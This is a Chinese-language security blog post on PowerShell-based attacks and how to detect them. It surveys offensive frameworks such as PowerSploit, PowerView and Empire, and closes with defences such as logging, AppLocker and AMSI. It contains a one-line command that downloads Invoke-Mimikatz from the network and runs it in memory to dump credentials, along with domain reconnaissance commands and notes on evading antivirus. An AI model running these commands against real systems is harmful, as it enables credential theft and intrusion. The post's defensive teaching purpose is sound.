# PowerShell攻击与检测

## 讲在前面

这篇文章相对目前的大环境来说，已经不合时宜了，但我们还是要拿出来讲一讲，思考思考Powershell的攻击与检测问题。以期望给目前国内的中小企业的网络安全建设提供一些建议。

## Powershell作为工具的演变

Powershell是Microsoft Windows所有受支持版本（Win7/Windows 2008 R2和更高版本）上内置的命令行工具。微软称其为是最安全，最透明的Shell、脚本语言或编程语言。但恰恰因为其强大，也吸引了攻击者的注意力。因为其可以在内存中执行代码的特点，攻击者会调用powershell来运行恶意代码，用来绕过windows defender。此后越来越多的攻击手法层出不穷，花样繁杂。  


## Powershell攻击

攻击者喜欢使用Powershell作为攻击载体的原因有很多，例如：  


> * 在内存中加载shellcode，无需落地 
> * 支持远程代码执行
> * 支持灵活的调用.Net和Windows API
> * 一般管理员会禁用cmd.exe而不会禁用powershell.exe
> * 就目前来看还是有许多安全产品未重视powershell的活动

**举个例子，powershell作为攻击工具时会用到的参数**

> -WindowsStyle Hidden //表示PowerShell会话窗口应以隐藏方式启动  
> -NoProfile //在Powershell启动时不执行当前用户导入的配置文件内的配置脚本  
> -ExecutionPolicy Bypass //它禁用当前PowerShell会话的执行策略（默认情况下不允许执行）。应该注意的是，执行策略并不是安全边界  
> -File &lt;FilePath&gt; //文件路径，  
> -Command &lt;Command&gt; //命令  
> -EncodedCommand &lt;BASE64EncodedCommand&gt;  //后面跟base64编码的命令

## 实际渗透中会用到的部分Powershell工具

### [**PowerSploit**](https://github.com/PowerShellMafia/PowerSploit) 

**描述：**该工具是一款强大的powershell后渗透测利用框架。  


**作用：**信息收集、权限提升、凭证盗取，权限维持

**作者：**遗憾的是该项目不在受维护了，Matt Graeber（@Mattifestation）和Chris Campbell（@obscuresec）

#### 其中使用频率非常高的脚本有：

> * Invoke-DllInjection.ps1
> * Invoke-Shellcode.ps1
> * Invoke-WmiCommand.ps1
> * Get-GPPPassword.ps1
> * Get-Keystrokes.ps1
> * Get-TimedScreenshot.ps1
> * Get-VaultCredential.ps1
> * Invoke-CredentialInjection.ps1
> * Invoke-Mimikatz.ps1
> * Invoke-NinjaCopy.ps1
> * Invoke-TokenManipulation.ps1
> * Out-Minidump.ps1
> * VolumeShadowCopyTools.ps1
> * Invoke-ReflectivePEInjection.ps1

#### [Invoke-Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1) 

描述：使用Powershell执行Mimikatz来完成凭证的盗取和注入，伪造票据等

作用：凭证盗用和重放，权限维持

作者：Joseph Bialek（@ clymb3r）

```text
powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201009153119790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


**注意：** 

**该命令在win2008执行会因版本低而无法执行，在win2016执行会被AppLocker强制实施受约束。成功的测试为win2012**

![](https://img-blog.csdnimg.cn/20201009153029828.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


![](https://img-blog.csdnimg.cn/20201009153044445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


#### [**PowerView**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) 

**描述：Powershell的内网信息收集工具，现已集成到**PowerSploit  


**作用：信息收集**

**作者：**Will Harmjoy（@ HarmJ0y）  


使用也有文章介绍:  


参考：  


[PowerView介绍](https://blog.csdn.net/prettyX/article/details/103874602)

```text
Get-NetDomain            获取当前用户所在的域名称
Get-NetUser              返回所有用户详细信息
Get-NetDomainController  获取所有域控制器
Get-NetComputer          获取所有域内机器详细信息
Get-NetOU                获取域中OU信息
Get-NetGroup             获取所有域内组和组成员信息
Get-NetFileServer        根据SPN获取当前域使用的文件服务器
Get-NetShare             获取当前域内所有网络共享
Get-NetSession           获取在指定服务器存在的Session信息
Get-NetRDPSession        获取在指定服务器存在的远程连接信息
Get-NetProcess           获取远程主机的进程信息
Get-UserEvent            获取指定用户日志信息
Get-ADObject             获取活动目录的对象信息
Get-NetGPO               获取域所有组策略对象
Get-DomainPolicy         获取域默认或域控制器策略
Invoke-UserHunter        搜索网络中域管理员正在使用的主机
Invoke-ProcessHunter     查找域内所有机器进程用于找到某特定用户
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

![](https://img-blog.csdnimg.cn/20201002204941587.png?x-oss-process=image%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln%2Csize_16%2Ccolor_FFFFFF%2Ct_70)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​ 

#### [**PowerUp**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) 

**描述：**本地特权提升的脚本，现已经集成到PowerShell Empire中

**作用：权限提升**

**作者：**Will Harmjoy（@ harmj0y）

此处我们不进行赘述，实用的使用方法和深入的研究，国内外都有研究员做了工作：

参考：  


* [Powershell 提权框架-Powerup](http://www.vuln.cn/6436)
* [POWERUP攻击渗透实战2](https://www.cnblogs.com/-qing-/p/10557520.html#_lab2_3_0) 

### [**Nishang**](https://github.com/samratashok/nishang) 

**描述：渗透测试和评估内网安全，脚本可以贯穿渗透测试的每个阶段**  


**作用：信息收集、凭据盗用、权限提升、权限维持**  


**作者：**Nikhil Mitt（@nikhil\_mitt）  


此处我们不进行赘述，实用的使用方法和深入的研究，国内外都有研究员做了工作：  


参考：[Powershell 渗透测试工具-Nishang](https://www.cnblogs.com/bonelee/p/8258440.html)

### [**PowerShell Empire**](https://github.com/PowerShellEmpire/Empire) 

**描述：**

* 基于PowerShell的远程访问木马（RAT）。
* Python服务器组件（Kali Linux）。
* AES加密的C2通道。
* 转储并跟踪数据库中的凭据
* 无需powershell.exe即可运行Powershell

**作用：**集成开源模块，可供自定义开发。可以进行信息收集，凭据盗用和重放以及权限维持

**作者：**Will Schroeder（@ harmj0y）和Justin Warner（@sixdub）＆Matt Nelson（@ enigma0x3）

此处我们不进行赘述，实用的使用方法和深入的研究，国内外都有研究员做了工作：  


参考：[PowerShell Empire实战入门篇](https://www.freebuf.com/sectool/158393.html)  


### [**PS&gt;Attack**](https://github.com/jaredhaight/psattack) 

**描述：包含众多的Powershell攻击脚本，仓库已经私有化**

**作用：权限提升、信息收集、平凭据盗取**

**作者**：Jared Haight

此处我们不进行赘述，实用的使用方法和深入的研究，国内有研究员做了工作：  


参考：[PSAttack介绍](https://www.freebuf.com/sectool/139910.html)  


## 小结

使用Powershell攻击的工具肯定不止上述这一行，工具是非常多的，如果仅依靠上述工具，加以修改完善并灵活运用的话也是非常不错的，既然谈到了攻击，我们就必须要讲防御。简单的来说，我们认为将Powershell.exe删除就万事大吉了，其实不然，Powershell不仅仅是一个可执行文件，他是System.Management.Automation.dll动态链接库文件（DLL）中存在的Windows的核心组件（不可移动），可以承载实际上是PowerShell实例的不同运行空间（请考虑PowerShell.exe和PowerShell\_ISE.exe）。可以通过代码实例化自定义PowerShell运行空间，因此可以通过自定义编码的可执行文件（例如MyPowershell.exe）执行PowerShell，类似于[**Empire**](https://github.com/PowerShellEmpire/Empire)**工具就可以在没有powershell.exe情况下继续执行powershell命令**，国内的研究员对此也研究总结了[无powershell运行powershell的方法](https://zhuanlan.zhihu.com/p/94639339)，以此绕过AV  


## **PowerShell v5安全性增强** 

脚本块的日志记录：

脚本块日志记录提供了将模糊处理的PowerShell代码记录到事件日志中的功能。在执行之前，大多数攻击工具通常使用Base64编码进行模糊处理，使其更加难以被检测或识别其实际运行的代码。所以该功能将完整的记录疑似威胁的powershell代码  


**使用AppLocker强制实施受约束的PowerShell**  


安装PowerShell v5且AppLocker处于允许模式时，PowerShell以受约束的语言模式运行，这是一种受限的语言模式，无法访问Windows API  


![](https://img-blog.csdnimg.cn/20201009153029828.png)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)​  


Windows 10中的**反恶意软件扫描接口（AMSI）**  


系统上执行的所有脚本的代码必须经过AMSI扫描后才能执行，企业引入反恶意软件扫描接口（AMSI）用来扫描基于脚本的入侵攻击和恶意软件

参考国内研究员的相关文章：

[如何识别并分析反恶意软件扫描接口（AMSI）组件](https://www.freebuf.com/articles/terminal/216921.html)  


## 绕过Poweshell更新的部分脚本语言

就以往来看，攻击者想要绕过Powershell中更新的安全防御功能的话，将其直接删除是一种选择，你也可以使用如下脚本语言或工具来及进行绕过。

> * Custom executables \(EXEs\)
> * Windows command tools
> * Remote Desktop
> * Sysinternal tools
> * Windows Scripting Host
> * VBScript
> * CScript
> * JavaScript
> * Batch files
> * PowerShell

## 防御并检测Powershell的活动

使用最新版本的Powershell并启用脚本块日志记录和模块日志记录

开启Powershell日志记录

**正确部署Powershell的**AppLocker功能

由于PowerShell用于系统管理和登录脚本（与Exchange和DSC一样，越来越多地用于应用程序管理），因此一味的阻止PowerShell是不现实的，最好的情况就是将其配置为受限的语言模式，从而将Powershell锁定到核心元素（无API或.NET访问权限）  


## **相关文章**

* [BSides演示文稿发布：PowerShell安全性：防御企业免受最新攻击平台的攻击](https://adsecurity.org/?p=2843)
* [下载PowerShell版本5](https://adsecurity.org/?p=2668)
* [检测攻击性PowerShell攻击工具](https://adsecurity.org/?p=2604)
* [PowerShell版本5安全性增强](https://adsecurity.org/?p=2277)

